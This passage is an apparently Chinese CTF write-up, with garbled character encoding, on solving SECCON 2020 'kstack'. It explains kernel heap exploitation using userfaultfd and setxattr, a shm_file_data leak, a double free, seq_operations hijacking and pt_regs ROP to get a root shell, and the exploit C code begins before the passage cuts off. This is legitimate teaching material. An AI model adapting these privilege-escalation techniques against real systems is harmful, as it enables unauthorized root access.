userfaultfdï¼Œä»è€Œè®© setxattr çš„æ‰§è¡Œæµç¨‹å¡åœ¨æ­¤å¤„ï¼Œè¿™æ ·è¿™ä¸ª object å°±ä¸ä¼šè¢«é‡Šæ”¾æ‰ï¼Œè€Œæ˜¯å¯ä»¥ç»§ç»­å‚ä¸æˆ‘ä»¬æ¥ä¸‹æ¥çš„åˆ©ç”¨</strong> </p><p><a href="https://i.loli.net/2021/11/28/vBgSsTLRf5ZdYaJ.png"><img src="https://s2.loli.net/2023/02/06/9M1YfIZRdFLxCHo.png" alt="image.png"></a></p><p>è¿™ä¾¿æ˜¯ setxattr + userfaultfd ç»“åˆçš„å †å ä½æŠ€æœ¯</p><h3 id="ä¾‹é¢˜ï¼šSECCON-2020-kstack"><a href="#ä¾‹é¢˜ï¼šSECCON-2020-kstack" class="headerlink" title="ä¾‹é¢˜ï¼šSECCON 2020 kstack"></a>ä¾‹é¢˜ï¼šSECCON 2020 kstack</h3><h4 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>æƒ¯ä¾‹åœ°æŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs BASH"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 512M \<br>    -kernel ./bzImage \<br>    -initrd ./rootfs.cpio \<br>    -append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet&quot;</span> \<br>    -cpu kvm64,+smep \<br>    -net user -net nic -device e1000 \<br>    -monitor /dev/null \<br>    -nographic<br></code></pre></div></td></tr></table></figure><p>å¼€å¯äº† smep å’Œ kaslr</p><p>æŸ¥çœ‹ <code>/sys/devices/system/cpu/vulnerabilities/*</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL">/ $ cat /sys/devices/system/cpu/vulnerabilities/*<br>Processor vulnerable<br>Mitigation: PTE Inversion<br>Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown<br>Mitigation: PTI<br>Vulnerable<br>Mitigation: usercopy/swapgs barriers and __user pointer sanitization<br>Mitigation: Full generic retpoline, STIBP: disabled, RSB filling<br>Not affected<br></code></pre></div></td></tr></table></figure><p>å¼€å¯äº† KPTI</p><p>æ‹–å…¥ IDA ä¸­è¿›è¡Œåˆ†æï¼Œå‘ç°åªå®šä¹‰äº†ä¸€ä¸ª ioctl çš„ä¸¤ç§åŠŸèƒ½</p><h5 id="åˆ›å»ºé“¾è¡¨èŠ‚ç‚¹"><a href="#åˆ›å»ºé“¾è¡¨èŠ‚ç‚¹" class="headerlink" title="åˆ›å»ºé“¾è¡¨èŠ‚ç‚¹"></a>åˆ›å»ºé“¾è¡¨èŠ‚ç‚¹</h5><p>å…ˆåˆ†æç¬¬ä¸€ç§åŠŸèƒ½ï¼Œåœ¨è¿™é‡Œå…ˆç”¨ kmalloc åˆ†é…äº†ä¸€ä¸ª objectï¼Œä¹‹åå°†å…¶ä½¿ç”¨å¤´æ’æ³•é€šè¿‡å…¨å±€å˜é‡ head æ’å…¥åˆ°å•å‘é“¾è¡¨ä¸­</p><p><a href="https://i.loli.net/2021/11/24/mxPugZ1TQCE3aNd.png"><img src="https://s2.loli.net/2023/02/06/UtOXVYQpx2lCRPD.png" alt="image.png"></a></p><p>åˆ†æå¯çŸ¥å…¶ç»“æ„åº”å½“å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">void</span>            *unknown;<br>    <span class="hljs-keyword">char</span>             data[<span class="hljs-number">8</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>     *<span class="hljs-title">next</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>è¯¥ç»“æ„ä½“å‰å…«ä¸ªå­—èŠ‚æ˜¯ä» <code>current_task</code> çš„æŸä¸ªç‰¹æ®Šåç§»å–çš„å€¼ï¼Œç»å°è¯•å¯çŸ¥ä¸ºçº¿ç¨‹ç»„ idï¼Œæˆ‘ä»¬æ¥çœ‹å…¶åˆ†é…è¿‡ç¨‹ï¼Œä½¿ç”¨äº† <code>kmem_cache_alloc(kmalloc_caches[5], 0x60000C0)</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ flag ï¼Œä¸ºå¸¸è§„çš„ <code>GFP_KERNEL</code>ï¼Œè¿™é‡Œå¯ä»¥æš‚ä¸”å¿½ç•¥</p><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç¬”è€…æ¨æµ‹è¿™åº”å½“æ˜¯ gcc ä¼˜åŒ– kmalloc çš„ç»“æœï¼›åœ¨å†…æ ¸ä¸­æœ‰ä¸€ä¸ªæ•°ç»„ <code>kmalloc_caches</code> å­˜æ”¾ kmem_cacheï¼Œåœ¨å†…æ ¸æºç  <code>mm/slab_common.c</code> ä¸­æˆ‘ä»¬å¯ä»¥å¾—çŸ¥å…¶åˆå§‹åŒ–çš„å¤§å°</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * kmalloc_info[] is to make slub_debug=,kmalloc-xx option work at boot time.</span><br><span class="hljs-comment"> * kmalloc_index() supports up to 2^25=32MB, so the final entry of the table is</span><br><span class="hljs-comment"> * kmalloc-32M.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmalloc_info_struct</span> <span class="hljs-title">kmalloc_info</span>[] __<span class="hljs-title">initconst</span> =</span> &#123;<br>    INIT_KMALLOC_INFO(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">96</span>, <span class="hljs-number">96</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">192</span>, <span class="hljs-number">192</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">8</span>, <span class="hljs-number">8</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">16</span>, <span class="hljs-number">16</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>),<br><span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><p>ä¸‹æ ‡ <code>[5]</code> å³ç¬¬å…­ä¸ª kmem_cache ä¸º <code>kmalloc-32</code>ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥å¾—çŸ¥åˆ†é…çš„ object å¤§å°ä¸º 0x20</p><h5 id="åˆ é™¤é“¾è¡¨èŠ‚ç‚¹"><a href="#åˆ é™¤é“¾è¡¨èŠ‚ç‚¹" class="headerlink" title="åˆ é™¤é“¾è¡¨èŠ‚ç‚¹"></a>åˆ é™¤é“¾è¡¨èŠ‚ç‚¹</h5><p>æ¯”è¾ƒç®€å•ä¸”å¸¸è§„çš„è„±é“¾æ“ä½œï¼Œä¼šå°†åŒä¸€çº¿ç¨‹ç»„åˆ›å»ºçš„èŠ‚ç‚¹ä¸­çš„å¤´èŠ‚ç‚¹åˆ é™¤ï¼Œå¹¶å°†å…¶ data æ‹·è´ç»™ç”¨æˆ·</p><p><a href="https://i.loli.net/2021/11/24/jAEpYPWQSvDbq5M.png"><img src="https://s2.loli.net/2023/02/06/76iSTyZDgbCQL2z.png" alt="image.png"></a></p><p>è‹¥å¹¶èŠ‚ç‚¹æ‰€å±çº¿ç¨‹ç»„ä¸å½“å‰è¿›ç¨‹éåŒä¸€çº¿ç¨‹ç»„ï¼Œåˆ™ä¼šä¸€ç›´æ‰¾åˆ°é‚£ä¸ªçº¿ç¨‹ç»„çš„èŠ‚ç‚¹æˆ–æ˜¯éå†ç»“æŸä¸ºæ­¢</p><p><a href="https://i.loli.net/2021/11/25/s2SDNnlTWPobk6d.png"><img src="https://s2.loli.net/2023/02/06/JM26dSnHN1Wh9vy.png" alt="image.png"></a></p><p>åˆ†æä¸‹æ¥ï¼Œè”æƒ³åˆ°é¢˜ç›®åå« <code>k stack</code>ï¼Œæˆ‘ä»¬ä¸éš¾çŒœå‡ºè¿™æ˜¯åœ¨æ¨¡æ‹Ÿæ ˆçš„ push ä¸ pop æ“ä½œ</p><h4 id="åˆ©ç”¨-2"><a href="#åˆ©ç”¨-2" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>æˆ‘ä»¬æ³¨æ„åˆ°å…¶æ‹·è´æ—¶ä½¿ç”¨äº† copy_from_user ä¸ copy_to_userï¼Œä¸” <strong>ioctl æ“ä½œå…¨ç¨‹æ²¡æœ‰åŠ é”</strong>ï¼Œè¿™ä¸º userfaultfd æä¾›äº†å¯èƒ½æ€§</p><h5 id="1ï¼‰æ³„éœ²å†…æ ¸åŸºå€ï¼šshm-file-data"><a href="#1ï¼‰æ³„éœ²å†…æ ¸åŸºå€ï¼šshm-file-data" class="headerlink" title="1ï¼‰æ³„éœ²å†…æ ¸åŸºå€ï¼šshm_file_data"></a>1ï¼‰æ³„éœ²å†…æ ¸åŸºå€ï¼šshm_file_data</h5><p>åœ¨åˆ›å»ºèŠ‚ç‚¹æ—¶å…ˆå°†æ–°çš„ object èµ‹ç»™ head æŒ‡é’ˆï¼Œä¹‹åå†è°ƒç”¨ copy_from_userï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œå¯ä»¥é€šè¿‡ userfaultfd è®©åˆ†é…çº¿ç¨‹åœ¨ copy_from_user è¿™é‡Œå¡ä½ï¼Œä¹‹åæˆ‘ä»¬åœ¨ userfaultfd çº¿ç¨‹å½“ä¸­å†å°†è¯¥ object é‡Šæ”¾ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å¤Ÿè¯»å‡º 8 å­—èŠ‚çš„â€œè„æ•°æ®â€ï¼Œé‚£ä¹ˆåœ¨å¦‚æ­¤ä¹‹å‰æˆ‘ä»¬åº”å½“åˆ†é…ä¸€ä¸ªå¸¦æœ‰å¯ç”¨æ•°æ®çš„ç»“æ„ä½“å¹¶é‡Šæ”¾</p><p>ç”±äºé¢˜ç›®é™åˆ¶äº†åˆ†é…çš„ object çš„å¤§å°ï¼Œæ•…æˆ‘ä»¬åº”å½“è€ƒè™‘ä» kmallc-32 ä¸­åˆ†é…çš„ç»“æ„ä½“ï¼Œè¿™é‡Œç¬”è€…é€‰ç”¨ <code>shm_file_data</code> è¿™ä¸€ç»“æ„ä½“ï¼Œå…¶å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> &#123;</span><br>    <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> *<span class="hljs-title">vm_ops</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­æˆ‘ä»¬å¯ä»¥è¯»å–çš„ <code>ns</code> åŸŸåˆšå¥½æŒ‡å‘å†…æ ¸ .text æ®µï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥æ³„éœ²å‡ºå†…æ ¸åŸºå€</p><p>æˆ‘ä»¬å¯ä»¥åœ¨é€šè¿‡ <code>shmget</code> ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå…±äº«å†…å­˜ä¹‹åé€šè¿‡ <code>shmat</code> ç³»ç»Ÿè°ƒç”¨è·å¾—è¯¥ç»“æ„ä½“ï¼Œé€šè¿‡ <code>shmdt</code> æˆ‘ä»¬å¯ä»¥é‡Šæ”¾è¯¥ç»“æ„ä½“</p><blockquote><p>åœ¨è¿™é‡Œæœ‰ä¸ªç¬”è€…å¼„ä¸æ˜ç™½åŸå› çš„ç‚¹ï¼šæˆ‘ä»¬éœ€è¦å…ˆåˆ›å»º userfaultfd çº¿ç¨‹åå†è¿›è¡Œ shm æ“ä½œï¼Œ<strong>å¦åˆ™ä¼šå¤±è´¥</strong>ï¼Œåœ¨ç¬”è€…ç†è§£ä¸­è¿™æ“ä½œä¸¤ä¸ªä¹‹é—´çš„é¡ºåºå¹¶ä¸å…³é”®</p></blockquote><h5 id="2ï¼‰æ„é€ -double-free"><a href="#2ï¼‰æ„é€ -double-free" class="headerlink" title="2ï¼‰æ„é€  double free"></a>2ï¼‰æ„é€  double free</h5><p>æ„é€  double free çš„æµç¨‹æ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ pop æ—¶é€šè¿‡ copy_to_user è§¦å‘ userfaultfdï¼Œåœ¨ userfaultfd çº¿ç¨‹ä¸­å† pop ä¸€æ¬¡å³å¯</p><h5 id="3ï¼‰userfaultfd-setxattr-åŠ«æŒ-seq-operations-æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ"><a href="#3ï¼‰userfaultfd-setxattr-åŠ«æŒ-seq-operations-æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ" class="headerlink" title="3ï¼‰userfaultfd + setxattr åŠ«æŒ seq_operations æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ"></a>3ï¼‰userfaultfd + setxattr åŠ«æŒ seq_operations æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</h5><p>ç°åœ¨åœ¨ kmalloc-32 å½“ä¸­çš„ç¬¬ä¸€ä¸ª object æŒ‡å‘è‡ªèº«ï¼Œé‚£ä¹ˆåœ¨æ¥ä¸‹æ¥çš„ä¸¤æ¬¡åˆ†é…ä¸­æˆ‘ä»¬éƒ½å°†ä¼šè·å¾—åŒä¸€ä¸ª objectï¼Œç¬¬ä¸€æ¬¡åˆ†é…æ—¶ç¬”è€…é€‰æ‹©åˆ†é…åˆ° seq_operations å¤„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬é€šè¿‡ setxattr å†ä¸€æ¬¡åˆ†é…åˆ°è¯¥ objectï¼Œé€šè¿‡ setxattr æ›´æ”¹ seq_operations ä¸­çš„æŒ‡é’ˆ</p><p>ç”±äºæˆ‘ä»¬éœ€è¦åŠ«æŒå…¶ç¬¬ä¸€ä¸ªæŒ‡é’ˆï¼Œæ•…è¿™é‡Œæˆ‘ä»¬ä¸èƒ½å¤Ÿè®© setxattr æ‰§è¡Œåˆ°æœ«å°¾å°† object åˆé‡Šæ”¾æ‰ï¼Œè€Œåº”å½“åœ¨ setxattr ä¸­çš„ copy_from_user ä¸­ç”¨ userfaultfd å¡ä½ï¼Œåœ¨ userfaultfd çº¿ç¨‹ä¸­è§¦å‘åŠ«æŒåæŒ‡é’ˆæ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</p><p>æ§åˆ¶å†…æ ¸æ‰§è¡Œæµåç¬”è€…é€‰æ‹©ç”¨å¸¸è§„çš„ pt_regs æ¥å®Œæˆ ROP</p><h5 id="4-ä¿®å¤-kmalloc-32-çš„-freelist-æ‹¿åˆ°ç¨³å®š-root-shell"><a href="#4-ä¿®å¤-kmalloc-32-çš„-freelist-æ‹¿åˆ°ç¨³å®š-root-shell" class="headerlink" title="4) ä¿®å¤ kmalloc-32 çš„ freelist æ‹¿åˆ°ç¨³å®š root shell"></a>4) ä¿®å¤ kmalloc-32 çš„ freelist æ‹¿åˆ°ç¨³å®š root shell</h5><p>åœ¨æˆ‘ä»¬é€šè¿‡ double free å®Œæˆåˆ©ç”¨ä¹‹åï¼Œ<strong>å†…æ ¸ç©ºé—´çš„ kmalloc-32 çš„ freelistå·²ç»è¢«ç ´åäº†</strong>ï¼Œæ­¤æ—¶æˆ‘ä»¬è‹¥æ˜¯ç›´æ¥èµ·ä¸€ä¸ª shell åˆ™ä¼šé€ æˆ kernel panicï¼Œå› æ­¤æˆ‘ä»¬åœ¨è¿”å›ç”¨æˆ·ç©ºé—´ä¹‹åéœ€è¦å…ˆä¿®å¤ freelist</p><p>ä¿®å¤ freelist åªéœ€è¦å¾€é‡Œé¢æ”¾å…¥ä¸€å®šæ•°é‡çš„ object å³å¯ï¼Œç¬”è€…é€‰æ‹©åœ¨ä¸€å¼€å§‹æ—¶å…ˆå¤šæ¬¡æ‰“å¼€ <code>/proc/self/stat</code> åˆ†é…å¤§é‡ seq_operations ç»“æ„ä½“åšå¤‡ç”¨ï¼Œä¹‹ååœ¨ setxattr çº¿ç¨‹ä¸­å°†å…¶å…¨éƒ¨é‡Šæ”¾ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å¤Ÿå®Œç¾ç€é™†å›ç”¨æˆ·æ€ï¼Œå®‰å…¨åœ°èµ·ä¸€ä¸ªç¨³å®šçš„ root shell</p><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><blockquote><p>kernelpwn.h è§æœ¬æ–‡å¼€å¤´</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-keyword">int</span>             dev_fd;<br><span class="hljs-keyword">size_t</span>          seq_fd;<br><span class="hljs-keyword">size_t</span>          seq_fd_reserve[<span class="hljs-number">0x100</span>];<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span>     *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">size_t</span>   page_size;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">leak_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>      